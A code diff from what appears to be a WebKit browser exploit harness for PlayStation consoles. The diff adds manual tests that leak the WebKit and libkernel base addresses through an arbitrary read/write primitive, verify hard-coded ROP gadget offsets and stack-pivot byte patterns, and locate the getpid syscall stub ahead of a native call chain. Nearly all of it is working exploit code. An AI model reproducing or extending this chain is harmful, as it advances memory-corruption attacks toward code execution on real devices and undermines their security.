@@ -4,14 +4,12 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { groomBootLine, wireGroomBar } from "./groom_presets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250827m";
-/** opt-in only — release triggers JSC GC; chain_poops uses ?pair=1 (default off) */
+const BUILD_ID = "rw-20250828a";
+/** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
-/** Skip heavy pointer map on Start unless ?rwproof=1 (saves memory for native call) */
-const SKIP_RW_PROOF = params.get("rwproof") !== "1";
-/** getpid only when ?native=1 — auto after primitive OOMs on PS4 (96MB carrier still pinned) */
-const AUTO_NATIVE = params.get("native") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
+const ELF_MAGIC = 0x464c457f;
+const SYS_GETPID = 20;
 const HW_GADGETS_1352 = {
     wk_POP_RDI_RET: 0x4be55,
     wk_POP_RSI_RET: 0x7acb3,
@@ -39,7 +37,7 @@ const SS_LOG = "wk-rw-log";
 const SS_STATE = "wk-rw-state";
 const SS_LOG_BUILD = "wk-rw-log-build";
 /** Only persist milestones — not every ATTEMPT line (sessionStorage churn OOMs) */
-const PERSIST_TAGS = /^(PRIMITIVE|PAIR|NATIVE|PROOF|PASS|FAIL|WARN|BOOT|START-LITE|ERROR|PROMOTE|TRIM|UA-FW|LOAD|GIVE-UP|HINT-GROOM|LOG-CLEAR|ATTEMPT-START|READ-PRIMITIVE|WEBKIT|LIBKERNEL|GETPID|WRITE|LEAK)/;
+const PERSIST_TAGS = /^(PRIMITIVE|PAIR|NATIVE|GADGET|PASS|FAIL|WARN|BOOT|ERROR|PROMOTE|TRIM|UA-FW|LOAD|GIVE-UP|HINT-GROOM|LOG-CLEAR|ATTEMPT-START|READ-PRIMITIVE|WEBKIT|LIBKERNEL|GETPID|BASE|ELF|CODE|SAVE)/;
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;
 
 let persistBuf = null;
@@ -47,7 +45,8 @@ let raceMode = false;
 const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
-let btnStart, btnRefresh, btnNative, btnProof, btnPeek, btnClear;
+let btnStart, btnSaveBases, btnRwProof, btnNative, btnPeek, btnClear;
+let gadgetBtns = [];
 let nativeChain = null;
 let nativeAllowed = false;
 
@@ -163,12 +162,14 @@ function state(msg, cls) {
 
 function setUi() {
     if (btnStart) btnStart.disabled = busy || ready;
-    if (btnRefresh) btnRefresh.disabled = busy || !ready;
+    if (btnSaveBases) btnSaveBases.disabled = busy || !ready;
+    if (btnRwProof) btnRwProof.disabled = busy || !ready;
     if (btnNative) btnNative.disabled = busy || !ready || !nativeAllowed;
-    if (btnProof) btnProof.disabled = busy || !ready;
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
     if (addrIn) addrIn.disabled = busy || !ready;
+    for (let i = 0; i < gadgetBtns.length; i++)
+        gadgetBtns[i].disabled = busy || !ready;
 }
 
 function parseAddr(str) {
@@ -177,6 +178,220 @@ function parseAddr(str) {
     if (!/^[0-9a-f]+$/.test(s)) return null;
     if (s.length <= 8) return new int64(parseInt(s, 16), 0);
     return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
+}
+
+function fmtHex32(v) {
+    if (v == null) return "null";
+    return "0x" + (v >>> 0).toString(16);
+}
+
+function fmtBytes(arr) {
+    return arr.map(b => (b & 0xff).toString(16).padStart(2, "0")).join(" ");
+}
+
+/** Bases from sessionStorage only — no leakval (OOM-safe). */
+function basesFromSession(off) {
+    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
+    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
+    if (!webkitBase && nativeFn && off.wk_expm1_builtin)
+        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+    let libkernelBase = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
+    return { nativeFn, webkitBase, libkernelBase };
+}
+
+function checkPat(p, base, rva, pat) {
+    if (rva == null || !base) return { ok: false, detail: "no base/rva" };
+    const addr = base.add32(rva);
+    const got = [];
+    for (let i = 0; i < pat.length; i++) {
+        if (pat[i] === null) continue;
+        const b = read1p(p, addr.add32(i));
+        if (b == null) return { ok: false, detail: "read-fail @+" + rva.toString(16) };
+        got.push(b & 0xff);
+        if ((b & 0xff) !== pat[i])
+            return {
+                ok: false,
+                detail: "+0x" + rva.toString(16) + " got=" + fmtBytes(got)
+                    + " want=" + fmtBytes(pat.filter(x => x != null)),
+            };
+    }
+    return { ok: true, detail: "+0x" + rva.toString(16) + " " + fmtBytes(got) };
+}
+
+function isGetpidStub(v) {
+    if (!v) return false;
+    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
+    const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
+    return num === SYS_GETPID;
+}
+
+/** Manual tests — one button = minimal reads, one log line. */
+const MANUAL_TESTS = [
+    { id: "elf", group: "base", label: "ELF @ base" },
+    { id: "native", group: "base", label: "nativeFn code" },
+    { id: "libkernel", group: "base", label: "libkernel" },
+    { id: "stub20", group: "base", label: "getpid stub" },
+    { id: "pop_rdi", group: "pop", label: "POP RDI", key: "wk_POP_RDI_RET", pat: [0x5f, 0xc3] },
+    { id: "pop_rsi", group: "pop", label: "POP RSI", key: "wk_POP_RSI_RET", pat: [0x5e, 0xc3] },
+    { id: "pop_rdx", group: "pop", label: "POP RDX", key: "wk_POP_RDX_RET", pat: [0x5a, 0xc3] },
+    { id: "pop_rcx", group: "pop", label: "POP RCX", key: "wk_POP_RCX_RET", pat: [0x59, 0xc3] },
+    { id: "pop_rax", group: "pop", label: "POP RAX", key: "wk_POP_RAX_RET", pat: [0x58, 0xc3] },
+    { id: "pop_r8", group: "pop", label: "POP R8", key: "wk_POP_R8_RET", pat: [null, 0x58, 0xc3] },
+    { id: "pop_r9", group: "pop", label: "POP R9", key: "wk_POP_R9_RET", pat: [null, 0x59, 0xc3] },
+    { id: "leave", group: "pop", label: "LEAVE", key: "wk_LEAVE_RET", pat: [0xc9, 0xc3] },
+    { id: "mov_rdi_rax", group: "pivot", label: "MOV [rdi],rax", key: "wk_MOV_QWORD_PTR_RDI_RAX_RET", pat: [0x48, 0x89, 0x07, 0xc3] },
+    { id: "g0", group: "pivot", label: "G0", key: "wk_MOV_RDI_RSI_30_CALL", pat: [0x48, 0x8b, 0x7e, 0x30] },
+    { id: "g1", group: "pivot", label: "G1", key: "wk_POP_RAX_MOV_RAX_JMP_18", pat: [0x58, 0x48, 0x8b, 0x07] },
+    { id: "g2", group: "pivot", label: "G2", key: "wk_PUSH_RBP_MOV_RBP_RSP_10", pat: [0x55, 0x48, 0x89, 0xe5] },
+    { id: "g3", group: "pivot", label: "G3", key: "wk_MOV_RDI_RAX_8_CALL_20", pat: [0x48, 0x8b, 0x78, 0x08] },
+    { id: "g4", group: "pivot", label: "G4", key: "wk_MOV_RDX_RAX_18_CALL_10", pat: [0x48, 0x8b, 0x50, 0x38], spKey: true },
+    { id: "g5", group: "pivot", label: "G5", key: "wk_PUSH_RDX_POP_RSP_RET", pat: [0x52, 0x5c, 0xc3] },
+];
+
+function runManualTest(testId) {
+    if (!ready || !window.p || busy) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { nativeFn, webkitBase, libkernelBase } = basesFromSession(off);
+    const test = MANUAL_TESTS.find(t => t.id === testId);
+    if (!test) return;
+
+    if (test.group === "base") {
+        if (testId === "elf") {
+            if (!webkitBase) {
+                mark("GADGET-SKIP", "ELF — no webkitBase (Save bases or cal Accept)");
+                return;
+            }
+            const magic = read4p(p, webkitBase);
+            if (magic === ELF_MAGIC)
+                mark("GADGET-OK", "ELF magic @ " + webkitBase);
+            else if (off.wk_POP_RDI_RET != null) {
+                const g = checkPat(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3]);
+                mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
+                    "ELF miss peek=" + fmtHex32(magic) + " but POP_RDI " + g.detail);
+            } else {
+                mark("GADGET-BAD", "ELF @ " + webkitBase + " peek=" + fmtHex32(magic));
+            }
+            return;
+        }
+        if (testId === "native") {
+            if (!nativeFn) {
+                mark("GADGET-SKIP", "nativeFn — tap Save bases or cal Accept");
+                return;
+            }
+            const q0 = read4p(p, nativeFn);
+            if (q0 == null || q0 === 0 || q0 === 0xffffffff || q0 === 0xcccccccc)
+                mark("GADGET-BAD", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
+            else
+                mark("GADGET-OK", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
+            return;
+        }
+        if (testId === "libkernel") {
+            if (!webkitBase) {
+                mark("GADGET-SKIP", "libkernel — no webkitBase");
+                return;
+            }
+            if (!off.wk___imp___error || !off.k__error) {
+                mark("GADGET-SKIP", "libkernel — no IAT offsets in table");
+                return;
+            }
+            const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
+            if (!errorFn) {
+                mark("GADGET-BAD", "IAT __imp___error null");
+                return;
+            }
+            const lk = errorFn.sub32(off.k__error);
+            const w0 = read4p(p, lk);
+            const w1 = read4p(p, lk.add32(4));
+            if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
+                try { sessionStorage.setItem("wk-libkernelBase", String(lk)); } catch (_) { }
+                mark("GADGET-OK", "libkernel " + lk + " _error prologue");
+            } else {
+                mark("GADGET-BAD", "libkernel " + lk + " w0=" + fmtHex32(w0) + " w1=" + fmtHex32(w1));
+            }
+            return;
+        }
+        if (testId === "stub20") {
+            let lk = libkernelBase;
+            if (!lk && webkitBase && off.wk___imp___error && off.k__error) {
+                const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
+                if (errorFn) lk = errorFn.sub32(off.k__error);
+            }
+            if (!lk) {
+                mark("GADGET-SKIP", "getpid stub — run libkernel test first");
+                return;
+            }
+            const o = off.k_stubs && off.k_stubs[SYS_GETPID];
+            if (o == null) {
+                mark("GADGET-SKIP", "no k_stubs[20] offset");
+                return;
+            }
+            const v = read8p(p, lk.add32(o));
+            if (isGetpidStub(v))
+                mark("GADGET-OK", "getpid stub @ lk+" + o.toString(16));
+            else
+                mark("GADGET-BAD", "stub @+" + o.toString(16) + " read8=" + (v ? String(v) : "null"));
+            return;
+        }
+    }
+
+    if (!webkitBase) {
+        mark("GADGET-SKIP", test.label + " — no webkitBase (Save bases or cal Accept)");
+        return;
+    }
+    let pat = test.pat;
+    if (test.spKey && off.pivot_view_sp != null)
+        pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
+    const rva = off[test.key];
+    const g = checkPat(p, webkitBase, rva, pat);
+    mark(g.ok ? "GADGET-OK" : "GADGET-BAD", test.label + " " + g.detail);
+}
+
+function saveBasesManual() {
+    if (!ready || !window.p || busy) return;
+    busy = true;
+    setUi();
+    try {
+        const p = window.p;
+        const off = loadEffectiveOff();
+        const cell = p.leakval(Math.expm1);
+        const nativeFn = p.read8(p.read8(cell.add32(0x18))
+            .add32(off.wk_JSFunction_m_function || 0x28));
+        if (!nativeFn) {
+            mark("SAVE-FAIL", "nativeFn capture failed");
+            return;
+        }
+        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
+        const webkitBase = resolveWebkitBase(off, nativeFn);
+        if (webkitBase) {
+            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
+            mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
+        } else {
+            mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
+        }
+        state("bases saved — tap gadget buttons", "ok");
+    } finally {
+        busy = false;
+        setUi();
+    }
+}
+
+function wireGadgetBars() {
+    const groups = { base: $("gadget-base"), pop: $("gadget-pop"), pivot: $("gadget-pivot") };
+    for (let i = 0; i < MANUAL_TESTS.length; i++) {
+        const t = MANUAL_TESTS[i];
+        const host = groups[t.group];
+        if (!host) continue;
+        const b = document.createElement("button");
+        b.type = "button";
+        b.className = "secondary";
+        b.textContent = t.label;
+        b.disabled = true;
+        const id = t.id;
+        wireClick(b, function () { runManualTest(id); });
+        host.appendChild(b);
+        gadgetBtns.push(b);
+    }
 }
 
 function read8p(p, addr) {
@@ -357,7 +572,8 @@ function resolveLibkernelBase(p, off, webkitBase) {
 }
 
 function stripUiForNative() {
-    for (const id of ["groom-bar", "peek-bar", "hint", "map"]) {
+    for (const id of ["groom-bar", "peek-bar", "hint", "map",
+        "gadget-base", "gadget-pop", "gadget-pivot"]) {
         const el = document.getElementById(id);
         if (el) el.style.display = "none";
     }
@@ -448,23 +664,16 @@ function seedNativeSession(p, off) {
     return fn;
 }
 
-async function runChainProof() {
+async function runRwProofManual() {
     if (busy || !ready || !window.p) return;
     busy = true;
     setUi();
     try {
-        mark("PROOF-TRY", "chain verify — reads only + one 8-byte write");
-        const { runChainProof } = await import("./chain_proof.js");
-        const result = runChainProof(window.p, loadEffectiveOff(), { log: mark });
-        if (result.ok) {
-            state("PROOF-OK — chain verified (no syscall)", "ok");
-            flushPersistMilestones();
-        } else {
-            state("proof failed — see log", "bad");
-        }
-    } catch (err) {
-        mark("PROOF-FAIL", err.message || String(err));
-        state("proof error", "bad");
+        pointers.length = 0;
+        renderMap();
+        const ok = await runRwProof(window.p, loadEffectiveOff());
+        mark(ok ? "PASS" : "WARN", "RW proof map done — " + pointers.length + " ptrs");
+        state(ok ? "RW proof OK" : "RW proof partial", ok ? "ok" : "warn");
     } finally {
         busy = false;
         setUi();
@@ -666,37 +875,8 @@ async function runStart() {
         mark("PRIMITIVE-OK", "arb rw live");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
-
-        const off = loadEffectiveOff();
-        if (SKIP_RW_PROOF) {
-            mark("START-LITE", "auto-native=" + AUTO_NATIVE
-                + " promote=" + PROMOTE_PAIR);
-            ready = true;
-            state("primitive OK — tap Native call (?native=1 auto)", "ok");
-            if (AUTO_NATIVE && nativeAllowed) {
-                try { await doNativeCallImmediate(); }
-                catch (err) {
-                    if (nativeChain) {
-                        try { nativeChain.disarm(); } catch (_) { }
-                        nativeChain = null;
-                    }
-                    mark("NATIVE-FAIL", err.message || String(err));
-                    state("native call failed", "bad");
-                }
-            } else if (!nativeAllowed) {
-                state("pair broken — reload", "bad");
-            }
-        } else {
-            seedNativeSession(p, off);
-            const ok = await runRwProof(p, off);
-            ready = true;
-            if (ok) {
-                state("RW-ONLY-OK — tap addresses or peek", "ok");
-                mark("RW-ONLY-OK", pointers.length + " pointers mapped");
-            } else {
-                state("primitive OK — some rw checks failed", "warn");
-            }
-        }
+        ready = true;
+        state("primitive OK — tap Save bases, then test gadgets", "ok");
     } catch (err) {
         state("failed: " + err.message, "bad");
         mark("ERROR", err.stack || err.message);
@@ -707,11 +887,7 @@ async function runStart() {
 }
 
 function refreshMap() {
-    if (!ready || !window.p) return;
-    pointers.length = 0;
-    const off = loadEffectiveOff();
-    runRwProof(window.p, off);
-    mark("REFRESH", pointers.length + " pointers");
+    runRwProofManual();
 }
 
 function reportErr(err) {
@@ -741,9 +917,9 @@ function init() {
     pickPtr = $("pick-ptr");
     addrIn = $("addr-in");
     btnStart = $("btn-start");
-    btnRefresh = $("btn-refresh");
+    btnSaveBases = $("btn-save-bases");
+    btnRwProof = $("btn-rw-proof");
     btnNative = $("btn-native");
-    btnProof = $("btn-proof");
     btnPeek = $("btn-peek");
     btnClear = $("btn-clear");
 
@@ -752,10 +928,11 @@ function init() {
         return;
     }
 
+    wireGadgetBars();
     wireClick(btnStart, function () { return runStart(); });
-    wireClick(btnRefresh, refreshMap);
+    wireClick(btnSaveBases, saveBasesManual);
+    wireClick(btnRwProof, function () { return runRwProofManual(); });
     wireClick(btnNative, function () { return runNativeCall(); });
-    wireClick(btnProof, function () { return runChainProof(); });
     wireClick(btnClear, function () {
         lines.length = 0;
         clearPersistedLog();
@@ -779,7 +956,7 @@ function init() {
     if (params.get("clearlog") === "1") clearPersistedLog();
     else if (RESTORE_LOG && restorePersistedLog()) renderOut();
 
-    mark("BOOT", "build=" + BUILD_ID + " — use Verify chain (OOM-safe proof)");
+    mark("BOOT", "build=" + BUILD_ID + " — manual steps only (primitive auto-retries)");
     mark("BOOT", groomBootLine(params));
     window.addEventListener("beforeunload", function () {
         if (stateEl) persistState(stateEl.textContent, stateEl.className);
@@ -787,7 +964,7 @@ function init() {
     });
     wireGroomBar(() => busy);
     setUi();
-    state("ready — pick groom if needed, then Start", "");
+    state("ready — groom → Start → Save bases → test gadgets one-by-one", "");
 }
 
 function bootUi() {
